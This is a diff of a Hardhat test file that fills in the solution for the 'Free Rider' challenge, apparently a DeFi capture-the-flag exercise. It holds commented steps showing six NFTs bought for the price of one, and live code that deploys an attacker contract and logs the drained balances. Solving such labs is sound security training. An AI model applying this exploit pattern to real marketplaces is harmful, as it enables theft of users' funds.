@@ -29,7 +29,7 @@ describe('[Challenge] Free Rider', function () {
         [deployer, player, devs] = await ethers.getSigners();
 
         // Player starts with limited ETH balance
-        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
+        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
         expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);
 
         // Deploy WETH
@@ -106,6 +106,62 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // THIS IS A MANUAL TEST FOR THE ATTACK.
+        // console.log("Player balance before buying NFTs: ", 
+        //     ethers.utils.formatEther(await ethers.provider.getBalance(player.address)));
+        // console.log("Marketplace balance before selling NFTs: ", 
+        //     ethers.utils.formatEther(await ethers.provider.getBalance(marketplace.address)));
+        // await marketplace.connect(player).buyMany(
+        //     [0, 1, 2, 3, 4, 5],
+        //     { value: NFT_PRICE }
+        // );
+        // console.log("Player balance after buying NFTs: ", 
+        //     ethers.utils.formatEther(await ethers.provider.getBalance(player.address)));
+        // console.log("Marketplace balance after selling NFTs: ", 
+        //     ethers.utils.formatEther(await ethers.provider.getBalance(marketplace.address)));
+        // for (let tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
+        //     expect(await nft.ownerOf(tokenId)).to.be.eq(player.address);
+        // }
+
+        // await nft.connect(player).setApprovalForAll(marketplace.address, true);
+
+        // await marketplace.connect(player).offerMany(
+        //     [0, 1, 2, 3, 4, 5],
+        //     [NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE]
+        // );
+
+        // await marketplace.connect(player).buyMany(
+        //     [0, 1],
+        //     { value: NFT_PRICE }
+        // );
+        // console.log("Player balance after buying NFTs: ", 
+        //     ethers.utils.formatEther(await ethers.provider.getBalance(player.address)));
+        // console.log("Marketplace balance after selling NFTs: ", 
+        //     ethers.utils.formatEther(await ethers.provider.getBalance(marketplace.address)));
+
+        const attackFactory = await ethers.getContractFactory('FreeRiderAttacker', player);
+        const attackContract = await attackFactory.deploy(
+            marketplace.address,
+            uniswapPair.address,
+            weth.address,
+            nft.address,
+            devsContract.address
+        );
+
+        console.log("Player balance before attack: ", 
+            ethers.utils.formatEther(await ethers.provider.getBalance(player.address)));
+        console.log("Marketplace balance before attack: ", 
+            ethers.utils.formatEther(await ethers.provider.getBalance(marketplace.address)));
+        console.log("Recovery contract: ", devsContract.address);
+        await attackContract.connect(player).attack();
+        console.log("Player balance after attack: ", 
+            ethers.utils.formatEther(await ethers.provider.getBalance(player.address)));
+        console.log("Attacker balance after attack: ", 
+            ethers.utils.formatEther(await ethers.provider.getBalance(attackContract.address)));
+        console.log("Marketplace balance after attack: ",
+            ethers.utils.formatEther(await ethers.provider.getBalance(marketplace.address)));
+        
     });
 
     after(async function () {
